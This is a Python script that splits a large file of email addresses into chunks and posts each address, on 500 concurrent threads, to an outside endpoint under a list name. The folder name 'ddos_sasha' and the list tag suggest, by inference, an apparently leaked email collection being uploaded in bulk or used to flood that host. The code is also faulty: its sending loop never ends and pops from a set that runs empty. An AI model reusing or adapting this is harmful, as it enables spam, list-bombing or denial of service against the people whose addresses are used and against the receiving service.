from pprint import pprint as print
import pathlib
import threading
from typing import Generator

import requests

url = "https://k0d.info/postmail/index.php"
headers = {}
ENCODING = 'latin-1'
CHUNK_SIZE = 40_000_000
source_name = 'lnkdclctn1'


def read_file_in_chunks(file_name: str | pathlib.Path, chunk_size: int) -> Generator:
    with open(file_name, encoding=ENCODING) as file:
        tmp_lines = file.readlines(chunk_size)
        while tmp_lines:
            yield set(tmp_lines)
            tmp_lines = file.readlines(chunk_size)


def send_email(source_name: str, email: str) -> None:
    try:
        res = requests.post(url, headers=headers, data={'list': source_name, 'email': email})
        print(res.text)
    except Exception as e:
        print(e)


def sent_emails():
    with open('emails_glued_1.txt') as file:
        emails = set(file.read().split('\n'))
    while len(emails) >= 0:
        threads: list[threading.Thread] = []
        for _ in range(500):
            print(len(emails))
            email = emails.pop()
            if email:
                t = threading.Thread(target=send_email, args=(source_name, email))
                t.start()
                threads.append(t)
        for t in threads:
            t.join()


def main():
    file_name = r'C:\Users\Administrator\Desktop\ddos_sasha\emails_glued_1.txt'

    chunk_counter = 0
    for chunk in read_file_in_chunks(file_name, CHUNK_SIZE):
        with open(f'emails\{source_name}_{chunk_counter}.txt', 'w') as file:
            file.write(''.join(chunk))
        chunk_counter += 1
        print(chunk_counter)


if __name__ == '__main__':
    main()
    input('finish!')
